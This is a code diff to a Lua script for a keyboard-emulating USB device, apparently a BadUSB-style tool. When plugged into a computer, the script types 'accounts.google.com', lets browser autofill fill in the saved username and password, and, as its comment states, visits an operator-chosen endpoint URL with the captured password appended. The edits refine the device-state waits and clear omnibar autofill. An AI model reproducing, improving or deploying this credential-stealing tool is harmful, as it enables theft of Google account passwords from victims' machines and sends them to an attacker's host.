@@ -3,7 +3,7 @@
 ---
 require("common")
 
-kb = luausb.create({ id = 0, type = "keyboard" })
+kb = luausb.create({ type = "keyboard" })
 
 -- This URL will be visited with the captured password appended to the end
 local endpoint = prompt{
@@ -16,10 +16,7 @@ while true do
     print("idle")
 
     -- poll until usb plugged in
-    while luausb.state() == "not attached" do
-        wait(1000)
-    end
-
+    wait_for_state("configured")
     wait_for_detect(kb)
     print("running")
 
@@ -30,7 +27,10 @@ while true do
     wait(2000)
 
     -- navigate to login page
-    kb:string("accounts.google.com\n")
+    kb:string("accounts.google.com")
+    -- get rid of any autofill that appears in the omnibar
+    kb:press(KEY_DELETE)
+    kb:press(KEY_ENTER)
     wait(2000)
 
     -- autofill username and continue
@@ -66,10 +66,8 @@ while true do
     wait(1000)
 
     print("done")
-    -- poll until usb unplugged
-    while luausb.state() == "configured" do
-        wait(1000)
-    end
+    wait_for_state("not attached")
+
     print("disconnected")
 end
 
